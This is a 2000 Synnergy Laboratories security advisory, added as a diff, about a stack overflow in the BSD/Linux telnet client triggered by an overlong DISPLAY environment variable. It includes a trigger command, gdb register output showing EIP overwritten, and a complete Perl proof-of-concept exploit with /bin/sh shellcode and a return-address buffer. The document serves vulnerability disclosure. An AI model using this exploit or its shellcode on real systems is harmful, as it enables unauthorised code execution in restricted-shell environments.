@@ -1,0 +1,141 @@
+
+        Synnergy Laboratories Advisory SLA-2000-14
+
+NAME
+
+       BSD/Linux telnet client overflow 
+
+AFFECTED
+ 
+  Linux
+        Debian
+        Redhat
+        Mandrake
+        Slackware
+        [ possibly others ]
+
+  BSD
+        FreeBSD
+        [ possible others ]
+
+
+SYNOPSIS
+
+ Synnergy Labs has found a bug in the telnet client that causes a stack 
+ overflow by filling the DISPLAY environment variable with approx 1000-3000 
+ bytes, allowing possible code execution to take place.
+
+
+DESCRIPTION
+
+ Synnergy has recently discovered a trivial bug in the BSD/Linux telnet client,
+ that overwrites the EIP register on the stack. From a security point of view
+ this bug would not cause much of a problem in general since the telnet client
+ does not run with elevated priviledges. Though, there are *possible* scenarios
+ where this bug may present itself. Such a case was provided by the FreeBSD
+ security admin, who said:
+ 
+ "a non-shell service providing environment, where users are not intended to
+ be able to execute arbitrary code, but can set environmental variables
+ (i.e., a telnet-in old-style BBS with a telnet-out function).  My suspicion is 
+ that if you have an environment like this, many base system tools suffer from 
+ this limitation "
+
+ Other possible scenarious would be, a restricted shell in a role playing game,
+ or message board system within the shell. Both these situations allow the user 
+ to manually edit the environment variables, thus giving reason behind this advisory.
+ Since the DISPLAY environment variable is passed through telnetd you could exploit 
+ an account without a password that runs telnet.
+
+ The bug occurs by setting the DISPLAY environment variable to around 1000 bytes,
+ though this may vary from distribution to distribution. Redhat segfaulted around
+ 2000.
+
+ Example: 
+
+ [ dethy@syn ] $ export DISPLAY=`perl -e 'print "A"x1000'`
+ [ dethy@syn ] $ telnet localhost
+
+ Trying 127.0.0.1...
+ Connected to localhost.
+ Escape character is '^]'.
+ Segmentation fault (core dumped)
+
+ Now loading up gdb, we see the following:
+ #0  0x41414141 in ?? ()
+ (gdb) info all-registers
+ eax            0xbfbfd672       -1077946766
+ ecx            0x3e     62
+ edx            0x80574d0        134575312 
+ ebx            0xf0     240
+ esp            0xbfbfd6e8       0xbfbfd6e8
+ ebp            0x41414141       0x41414141
+ esi            0xc      12
+ edi            0xf      15
+ eip            0x41414141       0x41414141
+ eflags         0x10246  66118
+
+ ..a successful hit! EIP and EBP were overwritten, thus arbitary code could
+ be spawned, but a shell is good enough for us. :)
+
+ Below is a proof of concept exploit that demonstrates the overflow by spawning
+ a shell through telnet, once the environment variable has been set.
+
+ #!/usr/bin/perl
+ # Generic exploit program in perl, which clears the environment to take
+ # away the need for offset guessing.
+ # Dvorak (@synnergy.net // @hit2000.org) 1999.
+
+ $egg = "\x90" x 1500;
+ $egg .= "\xeb\x37\x5e\x31\xc0\x88\x46\xfa\x89\x46\xf5\x89\x36\x89\x76";
+ $egg .= "\x04\x89\x76\x08\x83\x06\x10\x83\x46\x04\x18\x83\x46\x08\x1b";
+ $egg .= "\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x1d\x50\x56\xff";
+ $egg .= "\x36\xb0\x3b\x50\x90\x9a\x01\x01\x01\x01\x07\x07\xe8\xc4\xff";
+ $egg .= "\xff\xff\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02";
+ $egg .= "\x02\x02\x02/bin/sh.-c.sh";
+
+ foreach $key (keys %ENV) {
+    delete $ENV{$key};
+ }
+
+ # change the size of $buf if you need to.
+
+ $buf="";
+ for ($i = 0; $i < 256; $i++) {
+    $buf .= "\x01\xda\xbf\xbf";
+ }
+
+ # Put here your use for $buf, the string to exploit the vulnerable program with
+
+ $ENV{"DISPLAY"} = $buf;
+ $ENV{"egg"} = $egg;
+ system("/usr/bin/telnet localhost");
+
+ printf("Exploit done\n");
+ 
+
+SOLUTION
+
+        I have contacted the FreeBSD security admin, and he is working on his own advisory,
+        I would like to thank Rob Watson for his promptness.
+        Other distributions should come out with their advisories soon.
+        
+
+AUTHOR
+
+        Advisory : dethy @ synnergy.net
+        Discovery: hf @ synnergy.net
+        Exploit  : dvorak @ synnergy.net
+
+
+DISCLAIMER
+
+        Synnergy Laboratories may not be held liable for the use or potential
+        effects of these programs or advisories, nor the content contained
+        within. Use them at your own risk.
+
+COPYRIGHT
+
+        Synnergy Laboratories -  www.synnergy.net (c) 1998-2000 
+
+
